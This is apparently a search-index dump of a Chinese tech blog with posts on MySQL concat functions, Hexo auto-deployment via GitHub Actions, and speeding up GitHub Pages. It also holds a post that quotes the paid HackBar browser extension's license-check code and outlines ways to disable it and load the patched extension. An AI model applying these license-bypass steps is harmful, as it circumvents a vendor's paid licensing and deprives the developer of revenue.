","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/:1:2","series":null,"tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/#concat_wsseparatorstr1str2"},{"categories":["coding"],"content":"CONCAT_WS(separator,str1,str2,…) CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。 注意： 参数可以是字段名或具体值 如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。（只保留非空值） mysql\u003e select concat_ws('','','','33'); +--------------------------+ | concat_ws('','','','33') | +--------------------------+ | 33 | +--------------------------+ 1 row in set (0.04 sec) 如连接后以逗号分隔 mysql\u003e select concat_ws(',','11','22','33'); +-------------------------------+ | concat_ws(',','11','22','33') | +-------------------------------+ | 11,22,33 | +-------------------------------+ 1 row in set (0.00 sec) 和MySQL中concat函数不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL mysql\u003e select concat_ws(',','11','22',NULL); +-------------------------------+ | concat_ws(',','11','22',NULL) | +-------------------------------+ | 11,22 | +-------------------------------+ 1 row in set (0.00 sec) ","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/:1:2","series":null,"tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/#如连接后以逗号分隔"},{"categories":["coding"],"content":"CONCAT_WS(separator,str1,str2,…) CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。 注意： 参数可以是字段名或具体值 如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。（只保留非空值） mysql\u003e select concat_ws('','','','33'); +--------------------------+ | concat_ws('','','','33') | +--------------------------+ | 33 | +--------------------------+ 1 row in set (0.04 sec) 如连接后以逗号分隔 mysql\u003e select concat_ws(',','11','22','33'); +-------------------------------+ | concat_ws(',','11','22','33') | +-------------------------------+ | 11,22,33 | +-------------------------------+ 1 row in set (0.00 sec) 和MySQL中concat函数不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL mysql\u003e select concat_ws(',','11','22',NULL); +-------------------------------+ | concat_ws(',','11','22',NULL) | +-------------------------------+ | 11,22 | +-------------------------------+ 1 row in set (0.00 sec) ","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/:1:2","series":null,"tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/#和mysql中concat函数不同的是-concat_ws函数在执行的时候不会因为null值而返回null"},{"categories":["coding"],"content":"GROUP_CONCAT() 函数 group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’]) 基本查询 mysql\u003e select * from aa; +------+------+ | id| name | +------+------+ |1 | 10| |1 | 20| |1 | 20| |2 | 20| |3 | 200 | |3 | 500 | +------+------+ 6 rows in set (0.00 sec) 以id分组，把name字段的值打印在一行，逗号分隔(默认) mysql\u003e select id,group_concat(name) from aa group by id; +------+--------------------+ | id| group_concat(name) | +------+--------------------+ |1 | 10,20,20| |2 | 20 | |3 | 200,500| +------+--------------------+ 3 rows in set (0.00 sec) 以id分组，把去冗余的name字段的值打印在一行，逗号分隔 mysql\u003e select id,group_concat(distinct name) from aa group by id; +------+-----------------------------+ | id| group_concat(distinct name) | +------+-----------------------------+ |1 | 10,20| |2 | 20 | |3 | 200,500 | +------+-----------------------------+ 3 rows in set (0.00 sec) 以id分组，把name字段的值打印在一行，逗号分隔，以name排倒序 mysql\u003e select id,group_concat(name order by name desc) from aa group by id; +------+---------------------------------------+ | id| group_concat(name order by name desc) | +------+---------------------------------------+ |1 | 20,20,10 | |2 | 20| |3 | 500,200| +------+---------------------------------------+ 3 rows in set (0.00 sec) ","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/:1:3","series":null,"tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/#group_concat-函数"},{"categories":["coding"],"content":"GROUP_CONCAT() 函数 group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’]) 基本查询 mysql\u003e select * from aa; +------+------+ | id| name | +------+------+ |1 | 10| |1 | 20| |1 | 20| |2 | 20| |3 | 200 | |3 | 500 | +------+------+ 6 rows in set (0.00 sec) 以id分组，把name字段的值打印在一行，逗号分隔(默认) mysql\u003e select id,group_concat(name) from aa group by id; +------+--------------------+ | id| group_concat(name) | +------+--------------------+ |1 | 10,20,20| |2 | 20 | |3 | 200,500| +------+--------------------+ 3 rows in set (0.00 sec) 以id分组，把去冗余的name字段的值打印在一行，逗号分隔 mysql\u003e select id,group_concat(distinct name) from aa group by id; +------+-----------------------------+ | id| group_concat(distinct name) | +------+-----------------------------+ |1 | 10,20| |2 | 20 | |3 | 200,500 | +------+-----------------------------+ 3 rows in set (0.00 sec) 以id分组，把name字段的值打印在一行，逗号分隔，以name排倒序 mysql\u003e select id,group_concat(name order by name desc) from aa group by id; +------+---------------------------------------+ | id| group_concat(name order by name desc) | +------+---------------------------------------+ |1 | 20,20,10 | |2 | 20| |3 | 500,200| +------+---------------------------------------+ 3 rows in set (0.00 sec) ","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/:1:3","series":null,"tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/#基本查询"},{"categories":["coding"],"content":"GROUP_CONCAT() 函数 group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’]) 基本查询 mysql\u003e select * from aa; +------+------+ | id| name | +------+------+ |1 | 10| |1 | 20| |1 | 20| |2 | 20| |3 | 200 | |3 | 500 | +------+------+ 6 rows in set (0.00 sec) 以id分组，把name字段的值打印在一行，逗号分隔(默认) mysql\u003e select id,group_concat(name) from aa group by id; +------+--------------------+ | id| group_concat(name) | +------+--------------------+ |1 | 10,20,20| |2 | 20 | |3 | 200,500| +------+--------------------+ 3 rows in set (0.00 sec) 以id分组，把去冗余的name字段的值打印在一行，逗号分隔 mysql\u003e select id,group_concat(distinct name) from aa group by id; +------+-----------------------------+ | id| group_concat(distinct name) | +------+-----------------------------+ |1 | 10,20| |2 | 20 | |3 | 200,500 | +------+-----------------------------+ 3 rows in set (0.00 sec) 以id分组，把name字段的值打印在一行，逗号分隔，以name排倒序 mysql\u003e select id,group_concat(name order by name desc) from aa group by id; +------+---------------------------------------+ | id| group_concat(name order by name desc) | +------+---------------------------------------+ |1 | 20,20,10 | |2 | 20| |3 | 500,200| +------+---------------------------------------+ 3 rows in set (0.00 sec) ","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/:1:3","series":null,"tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/#以id分组把name字段的值打印在一行逗号分隔默认"},{"categories":["coding"],"content":"GROUP_CONCAT() 函数 group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’]) 基本查询 mysql\u003e select * from aa; +------+------+ | id| name | +------+------+ |1 | 10| |1 | 20| |1 | 20| |2 | 20| |3 | 200 | |3 | 500 | +------+------+ 6 rows in set (0.00 sec) 以id分组，把name字段的值打印在一行，逗号分隔(默认) mysql\u003e select id,group_concat(name) from aa group by id; +------+--------------------+ | id| group_concat(name) | +------+--------------------+ |1 | 10,20,20| |2 | 20 | |3 | 200,500| +------+--------------------+ 3 rows in set (0.00 sec) 以id分组，把去冗余的name字段的值打印在一行，逗号分隔 mysql\u003e select id,group_concat(distinct name) from aa group by id; +------+-----------------------------+ | id| group_concat(distinct name) | +------+-----------------------------+ |1 | 10,20| |2 | 20 | |3 | 200,500 | +------+-----------------------------+ 3 rows in set (0.00 sec) 以id分组，把name字段的值打印在一行，逗号分隔，以name排倒序 mysql\u003e select id,group_concat(name order by name desc) from aa group by id; +------+---------------------------------------+ | id| group_concat(name order by name desc) | +------+---------------------------------------+ |1 | 20,20,10 | |2 | 20| |3 | 500,200| +------+---------------------------------------+ 3 rows in set (0.00 sec) ","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/:1:3","series":null,"tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/#以id分组把去冗余的name字段的值打印在一行逗号分隔"},{"categories":["coding"],"content":"GROUP_CONCAT() 函数 group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’]) 基本查询 mysql\u003e select * from aa; +------+------+ | id| name | +------+------+ |1 | 10| |1 | 20| |1 | 20| |2 | 20| |3 | 200 | |3 | 500 | +------+------+ 6 rows in set (0.00 sec) 以id分组，把name字段的值打印在一行，逗号分隔(默认) mysql\u003e select id,group_concat(name) from aa group by id; +------+--------------------+ | id| group_concat(name) | +------+--------------------+ |1 | 10,20,20| |2 | 20 | |3 | 200,500| +------+--------------------+ 3 rows in set (0.00 sec) 以id分组，把去冗余的name字段的值打印在一行，逗号分隔 mysql\u003e select id,group_concat(distinct name) from aa group by id; +------+-----------------------------+ | id| group_concat(distinct name) | +------+-----------------------------+ |1 | 10,20| |2 | 20 | |3 | 200,500 | +------+-----------------------------+ 3 rows in set (0.00 sec) 以id分组，把name字段的值打印在一行，逗号分隔，以name排倒序 mysql\u003e select id,group_concat(name order by name desc) from aa group by id; +------+---------------------------------------+ | id| group_concat(name order by name desc) | +------+---------------------------------------+ |1 | 20,20,10 | |2 | 20| |3 | 500,200| +------+---------------------------------------+ 3 rows in set (0.00 sec) ","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/:1:3","series":null,"tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/#以id分组把name字段的值打印在一行逗号分隔以name排倒序"},{"categories":["coding"],"content":"区别 https://stackoverflow.com/questions/11889391/difference-between-group-concat-and-concat-ws ","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/:2:0","series":null,"tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/#区别"},{"categories":["coding"],"content":"concat_ws http://www.w3resource.com/mysql/string-functions/mysql-concat_ws-function.php ","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/:2:1","series":null,"tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/#concat_ws"},{"categories":["coding"],"content":"group_concat http://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php ","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/:2:2","series":null,"tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/#group_concat"},{"categories":["web-security"],"content":"前言 相信很多研究安全或者打CTF的朋友都在使用HackBar，在浏览器中使用HackBar构造并发送请求非常方便，特别是测试sql注入和xss等常见漏洞。 但是HackBar是收费软件，在其 官网 上，价格由3刀到89刀不等。很多安全研究人员会选择购买89刀的10年证书，但是对于学生来说，短期的一个月1刀的短期价格对于这样一个浏览器插件来说还是比较贵的。 考虑到浏览器扩展插件的逻辑代码都是js代码，并且大部分工具类插件的代码都存放在本地，所以破解这类软件变得非常简单。 未破解前的hackbar是这样的，按钮没法用，显示一个红框 下面我将以Chrome浏览器为例，对HackBar插件进行破解。 ","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/hack-hackbar/:1:0","series":null,"tags":["HackBar"],"title":"HackBar破解","uri":"https://zu1k.com/posts/security/web-security/hack-hackbar/#前言"},{"categories":["web-security"],"content":"破解插件 ","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/hack-hackbar/:2:0","series":null,"tags":["HackBar"],"title":"HackBar破解","uri":"https://zu1k.com/posts/security/web-security/hack-hackbar/#破解插件"},{"categories":["web-security"],"content":"找到插件路径 首先我们需要在官网上找到插件的安装地址并进行安装 安装后插件会存放在我们电脑的本地 在chrome中打开 version 页面，可以在 个人资料路径 位置找到Chrome浏览器数据的存放位置 我们在文件管理器中打开这个路径，找到里面的Extension目录，这个目录里面就存放了我们的所有扩展插件 我们可以在扩展程序界面看到所有插件的ID，找到HackBar的ID，然后从Extension目录中找到这个目录，进入后就是HackBar的插件目录 ","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/hack-hackbar/:2:1","series":null,"tags":["HackBar"],"title":"HackBar破解","uri":"https://zu1k.com/posts/security/web-security/hack-hackbar/#找到插件路径"},{"categories":["web-security"],"content":"分析授权验证 我们先将插件这个目录复制出来，然后用编辑器打开，其中授权验证相关代码在 theme\\js\\hackbar-panel.js 这个js文件中 // 授权验证失败 function disable_hackbar(message=null) { // 将hidden属性移除，就会显示输入证书的红框 $('#alert-license').removeClass('hidden'); // 如果有消息，就在证书那个红框显示出来 if(message){ $('#alert-license span').text(message); } // 标记证书无效 license_ok = false; } // 从chrome本地存储中获取都license内容 chrome.storage.local.get(['license'], function (result) { const license = result.license; // 如果证书内容存在 if (license) { //通过链接谷歌服务器检查网络情况 fetch(\"https://google.com\") .then(function (response) { // 从证书服务器检查证书 fetch(license_server + \"/\" + license) .then(function (response) { return response.json(); }) .then(function (data) { // 无效的证书会返回 // {\"pong\":false,\"message\":\"License is invalid\"} const pong = data.pong; if (pong === false) { // 证书无效，调用函数显示红框并使功能不可用 disable_hackbar(data.message); } }).catch(error =\u003e { // 授权服务器连接不上 disable_hackbar(); }); }) .then(function (data) { }).catch(error =\u003e { }); } else { // 证书不存在，直接禁用插件 disable_hackbar(); } }); ........ // 证书检查函数 function check_license(){ // 检查 license_ok 标记 if(!license_ok){ throw new Error('Please input valid license!'); } } ","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/hack-hackbar/:2:2","series":null,"tags":["HackBar"],"title":"HackBar破解","uri":"https://zu1k.com/posts/security/web-security/hack-hackbar/#分析授权验证"},{"categories":["web-security"],"content":"进行破解 通过上面对授权验证代码的分析，我们可以找到很多破解的思路，核心有一下几点： license_ok 一开始是 true 证书检查失败的红框一开始是隐藏的 授权验证失败调用的是 disable_hackbar() 函数 只在一处地方会向 服务器 检查证书状况 其他地方都是通过 check_license() 也就是 license_ok 标记检查授权的 也就是说，一共有两个关键点： 证书检查失败的红框 功能的正常使用 针对证书检查失败的红框，只需要 disable_hackbar 函数不运行 或者 里面去除hidden标记的代码不运行，就不会显示红框了 针对功能的正常使用，有很多办法可以达到： 首先我们知道，这些功能都是在调用 check_license() 函数检查授权情况的，所以我们可以将这个函数里面检查的代码全都注释掉 我们还发现， check_license() 函数是通过 license_ok 标记检查授权的，所以我们可以在检查前将 license_ok 标记为 true，或者说将前面标记 license_ok = false 的代码注释掉 最后我们发现，红框一开始是不显示的，license_ok一开始是true的，而前面所看到的授权验证的代码的唯一可能影响就是让红框显示、license_ok为false，所以那段代码直接删除了就ok了 我不会直接给出破解后的代码和插件的，希望大家能够根据上面的分析和破解思路自己进行破解 ","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/hack-hackbar/:2:3","series":null,"tags":["HackBar"],"title":"HackBar破解","uri":"https://zu1k.com/posts/security/web-security/hack-hackbar/#进行破解"},{"categories":["web-security"],"content":"插件安装 近年来，通过浏览器插件对用户进行攻击、获取用户隐私信息的攻击越来越多，现代浏览器厂商为了保护用户的安全，往往会对发布的浏览器插件进行严格审查，对未经签名验证的插件不予安装或安装后无法运行 所以我们破解后的HackBar是无法通过正常途径安装的，我们需要通过开发者模式进行安装 在扩展程序页面右上角打开 开发者模式，这样就可以不经签名安装自己开发的插件 左上角 加载已解压的扩展程序 按钮，我们选择刚刚破解好的HackBar目录，就可以顺利将 HackBar 安装上了 通过这种方式安装的插件，每一次chrome重新启动都会有一个提示框，很烦人，但是能用 当然，也可以通过注册开发者账号，将插件通过官方渠道审核、签名、发布 这样所有人都可以安装了，当然推荐是 不公开 的发布模式 安装后，按F12，插件就可以正常使用了 ","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/hack-hackbar/:3:0","series":null,"tags":["HackBar"],"title":"HackBar破解","uri":"https://zu1k.com/posts/security/web-security/hack-hackbar/#插件安装"},{"categories":["web-security"],"content":"总结 本文以HackBar的chrome插件的分析破解为例，想大家展示了浏览器插件的简单破解，Firefox的插件破解也是大同小异，希望大家可以活学活用 ","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/hack-hackbar/:4:0","series":null,"tags":["HackBar"],"title":"HackBar破解","uri":"https://zu1k.com/posts/security/web-security/hack-hackbar/#总结"},{"categories":["coding"],"content":"前言 很多同学和我一样也在用Hexo搭建自己的博客，通常最后发布的操作是 hexo g 生成静态网页，然后 hexo d 将public目录推送到github、coding、gitee等平台。 但是很多时候我们都想偷个懒，只管写博客，写完后将git 一 push，后面的生成部署工作让程序自动完成，github actions为我们提供了这个便利。 ","date":"2020-03-21","objectID":"https://zu1k.com/posts/coding/use-github-actions-to-auto-deploy-hexo/:1:0","series":null,"tags":["GitHub","CI/CD","Hexo"],"title":"使用Github Actions对Hexo博客自动部署","uri":"https://zu1k.com/posts/coding/use-github-actions-to-auto-deploy-hexo/#前言"},{"categories":["coding"],"content":"操作 ","date":"2020-03-21","objectID":"https://zu1k.com/posts/coding/use-github-actions-to-auto-deploy-hexo/:2:0","series":null,"tags":["GitHub","CI/CD","Hexo"],"title":"使用Github Actions对Hexo博客自动部署","uri":"https://zu1k.com/posts/coding/use-github-actions-to-auto-deploy-hexo/#操作"},{"categories":["coding"],"content":"开启actions功能 在我们博客的github仓库顶部可以找到 Actions 菜单，在里面我们可以搜索、选择各种预备好的actions模板，也可以点击 Set up a workflow yourself 按钮创建自己的工作流。 这里我的部署工作稍微复杂点，所以选择自己编写工作流配置文件。 在手动编写面板的右侧可以搜索别人写好的各种actions，方便我们使用这些actions配置一些基本的工作 当然，也可以选择在 hexo 根目录下创建 .github/workflows 目录，并在里面编写github actions配置文件的方法来开启这个功能。 ","date":"2020-03-21","objectID":"https://zu1k.com/posts/coding/use-github-actions-to-auto-deploy-hexo/:2:1","series":null,"tags":["GitHub","CI/CD","Hexo"],"title":"使用Github Actions对Hexo博客自动部署","uri":"https://zu1k.com/posts/coding/use-github-actions-to-auto-deploy-hexo/#开启actions功能"},{"categories":["coding"],"content":"基本部署 首先我们需要将git库的代码检出到github actions提供的容器中，这里使用github提供的checkout步骤 - uses: actions/checkout@master with: submodules: true 因为hexo需要依赖node.js环境，所以我们还要安装node环境 - uses: actions/setup-node@master with: node-version: 12.x 有了node环境后我们需要安装各种依赖包 - name: Installation run: | npm install npm install -g hexo-cli 依赖装好后就可以执行命令生成静态网站了 - name: Generate run: hexo clean \u0026\u0026 hexo g 最后一步就是将生成的public目录推到github仓库的page分支上，这样github pages就会将最新的网站自动部署了 - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: github_token: ${{ secrets.GITHUB_TOKEN }} publish_dir: ./public cname: g.blog.zu1k.com ","date":"2020-03-21","objectID":"https://zu1k.com/posts/coding/use-github-actions-to-auto-deploy-hexo/:2:2","series":null,"tags":["GitHub","CI/CD","Hexo"],"title":"使用Github Actions对Hexo博客自动部署","uri":"https://zu1k.com/posts/coding/use-github-actions-to-auto-deploy-hexo/#基本部署"},{"categories":["coding"],"content":"增加更多功能 在github actions工作流中，还可以完成更多更复杂的操作，里面可以直接执行shell脚本，可以使用docker镜像提供的特殊环境，大家可以根据自己需求进行修改。 ","date":"2020-03-21","objectID":"https://zu1k.com/posts/coding/use-github-actions-to-auto-deploy-hexo/:2:3","series":null,"tags":["GitHub","CI/CD","Hexo"],"title":"使用Github Actions对Hexo博客自动部署","uri":"https://zu1k.com/posts/coding/use-github-actions-to-auto-deploy-hexo/#增加更多功能"},{"categories":["coding"],"content":"完整配置文件 我的配置文件是适合我自己博客用的，里面还包括了网页、js、css、图片的压缩，cdn链接的替换，自动打release方便绕过jsDelivr的缓存。 name: Hexo CICD on: push: branches: - master jobs: deploy: name: hexo build \u0026 deploy runs-on: ubuntu-18.04 steps: - uses: actions/checkout@master with: submodules: true - uses: actions/setup-node@master with: node-version: 12.x - name: replace cdn url id: replace run: | tagname=$(date +%y%j%H%M) sed -i \"s/hexoblog/hexoblog@$tagname/g\" _config.yml sed -i \"s/hexoblog/hexoblog@$tagname/g\" themes/cactus/_config.yml echo \"::set-output name=tagname::$tagname\" - name: Installation run: | npm install npm install -g hexo-cli gulp - name: Generate run: hexo clean \u0026\u0026 hexo g \u0026\u0026 gulp \u0026\u0026 hexo d - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: github_token: ${{ secrets.GITHUB_TOKEN }} publish_dir: ./public cname: g.blog.zu1k.com - name: Create Release uses: actions/create-release@latest env: GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} with: tag_name: ${{ steps.replace.outputs.tagname }} release_name: ${{ steps.replace.outputs.tagname }} body: Automatic generated draft: false prerelease: true 在github actions将page专用分支更新后，zeit\\netlify\\github pages三个平台都会自动将最新的内容部署上，这样我就只需要关注博客内容，后续操作都不需要管了 ","date":"2020-03-21","objectID":"https://zu1k.com/posts/coding/use-github-actions-to-auto-deploy-hexo/:3:0","series":null,"tags":["GitHub","CI/CD","Hexo"],"title":"使用Github Actions对Hexo博客自动部署","uri":"https://zu1k.com/posts/coding/use-github-actions-to-auto-deploy-hexo/#完整配置文件"},{"categories":["coding"],"content":"前言 相信不少小伙伴都在使用 Github Pages 提供的免费静态网站托管来搭建自己的博客，但是因为墙的存在和特殊国情，使用 Github Pages 搭建的网站速度普遍不快，因此很多小伙伴只能转战国内付费的服务器和 CDN。 正巧我也在使用 Github Pages 搭建自己的静态博客，正好来说一下我的优化方法。 ","date":"2020-03-19","objectID":"https://zu1k.com/posts/coding/speedup-github-page/:1:0","series":null,"tags":["GitHub","jsDelivr"],"title":"加快Github Pages国内访问速度","uri":"https://zu1k.com/posts/coding/speedup-github-page/#前言"},{"categories":["coding"],"content":"压缩 默认情况下，如果我们查看 Hexo 生成的静态网页源代码，会发现存在大量的空格、空行、注释等无用内容。同样的，如果使用的 hexo 主题没有进行优化，大量的 css 和 js 文件也存在这样的垃圾内容。 如果你在一些大型网站右键查看网页源代码，你会发现他们的 html\\js\\css 是经过压缩处理的，没有多余的换行和注释，这势必会节省带宽流量和传输时间，提升用户体验。 所以我们优化速度的第一关就是对 Hexo 生成的代码进行压缩。 这里我使用的工具是 gulp ","date":"2020-03-19","objectID":"https://zu1k.com/posts/coding/speedup-github-page/:2:0","series":null,"tags":["GitHub","jsDelivr"],"title":"加快Github Pages国内访问速度","uri":"https://zu1k.com/posts/coding/speedup-github-page/#压缩"},{"categories":["coding"],"content":"安装 gulp 在自己本机安装 npm install gulp -g 为了 Github Action 或其他 CI\\CD 平台也能够进行安装，这里推荐 npm install gulp --save-dev 我们还需要一些依赖 npm install --save-dev \\ gulp-minify-css \\ gulp-babel \\ gulp-uglify \\ gulp-htmlmin \\ gulp-htmlclean \\ gulp-imagemin \\ imagemin-jpegtran \\ imagemin-svgo \\ imagemin-gifsicle \\ imagemin-optipng ","date":"2020-03-19","objectID":"https://zu1k.com/posts/coding/speedup-github-page/:2:1","series":null,"tags":["GitHub","jsDelivr"],"title":"加快Github Pages国内访问速度","uri":"https://zu1k.com/posts/coding/speedup-github-page/#安装-gulp"},{"categories":["coding"],"content":"创建配置文件 在博客 hexo 的根目录下，新建 gulpfile.js 配置文件 var gulp = require(\"gulp\"); var minifycss = require(\"gulp-minify-css\"); var uglify = require(\"gulp-uglify\"); var htmlmin = require(\"gulp-htmlmin\"); var htmlclean = require(\"gulp-htmlclean\"); var imagemin = require(\"gulp-imagemin\"); // 压缩css文件 gulp.task(\"minify-css\", function () { return gulp .src(\"./public/**/*.css\") .pipe(minifycss()) .pipe(gulp.dest(\"./public\")); }); // 压缩html gulp.task(\"minify-html\", function () { return gulp .src(\"./public/**/*.html\") .pipe(htmlclean()) .pipe( htmlmin({ collapseWhitespace: true, collapseBooleanAttributes: true, removeComments: true, removeEmptyAttributes: true, removeScriptTypeAttributes: true, removeStyleLinkTypeAttributes: true, minifyJS: true, minifyCSS: true, minifyURLs: true, ignoreCustomFragments: [/\\{\\{[\\s\\S]*?\\}\\}/], }) ) .pipe(gulp.dest(\"./public\")); }); // 压缩js文件 gulp.task(\"minify-js\", function () { return gulp .src([\"./public/**/*.js\", \"!./public/js/**/*min.js\"]) .pipe(uglify()) .pipe(gulp.dest(\"./public\")); }); // 压缩图片 gulp.task(\"minify-images\", function () { return gulp .src([ \"./public/**/*.png\", \"./public/**/*.jpg\", \"./public/**/*.gif\", \"./public/**/*.svg\", ]) .pipe( imagemin([ imagemin.gifsicle({ interlaced: true }), imagemin.mozjpeg({ quality: 75, progressive: true }), imagemin.optipng({ optimizationLevel: 5 }), imagemin.svgo({ plugins: [{ removeViewBox: true }, { cleanupIDs: false }], }), ]) ) .pipe(gulp.dest(\"./public\")); }); gulp.task( \"default\", gulp.series( gulp.parallel(\"minify-html\", \"minify-css\", \"minify-js\", \"minify-images\") ) ); ","date":"2020-03-19","objectID":"https://zu1k.com/posts/coding/speedup-github-page/:2:2","series":null,"tags":["GitHub","jsDelivr"],"title":"加快Github Pages国内访问速度","uri":"https://zu1k.com/posts/coding/speedup-github-page/#创建配置文件"},{"categories":["coding"],"content":"使用方法 在使用 hexo g 生成静态网站后， 运行 gulp 进行压缩 ","date":"2020-03-19","objectID":"https://zu1k.com/posts/coding/speedup-github-page/:2:3","series":null,"tags":["GitHub","jsDelivr"],"title":"加快Github Pages国内访问速度","uri":"https://zu1k.com/posts/coding/speedup-github-page/#使用方法"},{"categories":["coding"],"content":"使用 CDN 如果你查看博客的网络请求内容，你会发现在 html 加载之后，还有一堆小文件等待加载，而这些 css\\js\\图片文件的加载占据了大部分的网页打开时间。 因为 Github Pages 的延迟巨大，速度极慢，我们更有必要使用国内的 CDN 对这些资源进行分发。 不想使用国内付费的 CDN 服务，我尝试过使用 CloudFlare 进行加速（实质减速）效果不佳，后来发现了 jsDelivr。 jsDelivr 是一家开源免费 CDN，主要是对 npm 包进行 CDN 分发 绝妙的是它还能对 Github 和 Wordpress 进行 CDN 分发 我们可以借助 jsDelivr 的 Github 资源分发 服务来对我们博客中的 css\\js\\小图片进行加速 这是我目前找到的唯一一家在国内有节点并且不需要备案的 CDN 分发服务 这里我就以我使用的主题为例，分享一下我如何使用 jsDelivr 进行 CDN 分发 ","date":"2020-03-19","objectID":"https://zu1k.com/posts/coding/speedup-github-page/:3:0","series":null,"tags":["GitHub","jsDelivr"],"title":"加快Github Pages国内访问速度","uri":"https://zu1k.com/posts/coding/speedup-github-page/#使用-cdn"},{"categories":["coding"],"content":"链接格式 jsDelivr 针对 Github 资源有众多 URL 格式 https://cdn.jsdelivr.net/gh/user/repo@version/file https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/dist/jquery.min.js https://cdn.jsdelivr.net/gh/jquery/jquery@3.2/dist/jquery.min.js https://cdn.jsdelivr.net/gh/jquery/jquery@3/dist/jquery.min.js https://cdn.jsdelivr.net/gh/jquery/jquery/dist/jquery.min.js https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/src/core.min.js https://cdn.jsdelivr.net/gh/jquery/jquery/ 考虑到 jsDelivr 默认缓存时间是 7 天，如果我们想要修改实时生效而不需要等到缓存过期，最适合的是 https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/dist/jquery.min.js https://cdn.jsdelivr.net/gh/ github用户名 / 库名 @ 版本号或者tag / 路径/文件名 我们可以通过打 tag 来访问同一个资源文件的不同版本，而不需要考虑缓存时间 ","date":"2020-03-19","objectID":"https://zu1k.com/posts/coding/speedup-github-page/:3:1","series":null,"tags":["GitHub","jsDelivr"],"title":"加快Github Pages国内访问速度","uri":"https://zu1k.com/posts/coding/speedup-github-page/#链接格式"},{"categories":["coding"],"content":"替换链接 大部分 hexo 主题并不会对使用到的 js\\css\\图片\\字体 套上 CDN，我们来手动替换 css 样式表 大部分 css 样式会在 head 标签里面引入，这里的 css 样式表会阻塞页面的渲染，导致打开慢的体验，所以需要特别注意 我将我使用的主题的 style.css \\ rtl.css \\ disquesjs.css 替换成 jsDelivr，明显提升了等待时间 还有一些其他地方的 css 引入 js 脚本 寻找并替换各种调用到的 js 脚本 main.js disqusjs.js 还有其他的一些地方，不一一列举了 字体 字体需要特别注意，通常情况下比较大，耗时比较长 我使用的主题使用的字体通过 all.min.css 引入，因为前面这个 css 样式已经通过 jsDelivr 导入，里面的字体使用的是相对链接，所以字体默认也是通过 jsDelivr 引入了 img 小图片 一般是 logo 等资源，根据主题自行替换 